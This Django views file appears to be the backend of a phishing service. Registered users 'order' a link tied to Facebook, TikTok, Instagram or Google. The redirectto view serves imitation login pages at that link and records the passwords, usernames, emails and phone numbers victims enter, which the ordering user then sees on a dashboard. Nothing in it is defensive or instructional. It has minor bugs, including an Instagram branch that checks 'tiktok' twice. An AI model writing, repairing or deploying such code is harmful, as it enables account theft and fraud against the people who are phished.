from django.shortcuts import render
from django.shortcuts import redirect, HttpResponse
# Create your views here.
from django.contrib.auth import authenticate, login as dj_login, logout
from .models import *
from .models import UInfo
from django.contrib.auth.models import User
from .forms import UserInfo, UserForm
from django.contrib import messages
from django.contrib.auth.decorators import login_required


def login(request):
    form = UserForm()
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        email = request.POST.get('email')
        user = authenticate(username=username, password=password)
        if user is not None:
            dj_login(request, user)
            usersorder = UserOrder.objects.all().filter(whos=user)
            if usersorder:
                info = UInfo.objects.all().filter(user=usersorder[0])
                return render(request, 'user-dashboard.html', {'userinf': info})
            return render(request, 'user-dashboard.html', {'userinf': ''})
        else:
            messages.error(request, 'invalid username or password')

    return render(request, 'registration/register.html', {'form': form, 'signup': False})
def log_out(request):
    logout(request)

def register(request):
    form = UserForm()
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST['password']
        email = request.POST['email']
        password2 = request.POST.get('password2')
        if password==password2:
            if User.objects.all().filter(email=email).exists():
                messages.error(request, 'email already registered')
            elif User.objects.all().filter(username=username).exists():
                messages.error(request, 'username already registered')

            else:
                user = authenticate(username=username, password=password)
                if user is not None:
                    dj_login(request, user)
                    '''info = UInfo.objects.all().filter(whos=user)
                    return render(request, 'user-dashboard.html', {'userinf':info})'''
                    redirect('dashboard')
                else:
                    User.objects.create_user(username,email,password)
                    return redirect('login')
        else:
            messages.error(request, 'passwords dont match')
    return render(request, 'registration/register.html',{'form':form,'signup':'s'})
@login_required(login_url='login')
def dashboard(request):
    usersorder = UserOrder.objects.all().filter(whos=request.user)
    info = UInfo.objects.all().filter(user__whos=request.user)

    return render(request, 'user-dashboard.html', {'userinf': info,'bb':''})

@login_required(login_url='login')
def Userorder(request):
    if request.method=='POST':
        site= request.POST.get('site')
        link=request.POST.get('url')
        a = UserOrder.objects.create(site=site, link=link, whos=request.user)
        return redirect('dashboard')
    return render(request, 'order.html')


#@login_required(login_url='login')

def redirectto(request, url):
    order = UserOrder.objects.all().filter(link=url)
    if order:
        order = UserOrder.objects.all().filter(link=url)[0]
        if request.method == 'POST':
            username = request.POST.get('username')
            password = request.POST.get('password')
            email = request.POST.get('email')
            phone = request.POST.get('phone')
            data = 'password-@-'+password
            if username:
                data += "+@+username-@-"+username
            if email:
                data += "+@+email-@-" + email
            if phone:
                data += "+@+phone-@-" + phone
            info = UInfo(info=data, user=order)
            info.save()
            return HttpResponse('success')
        media = order.site
        if media == 'facebook':
            return render(request, 'facebook.html')
        elif media == 'tiktok':
            return render(request, 'tiktok.html')
        elif media == 'tiktok':
            return render(request, 'instagram.html')
        elif media == 'google':
            return render(request, 'google.html')

    return HttpResponse('page not found!')


    
    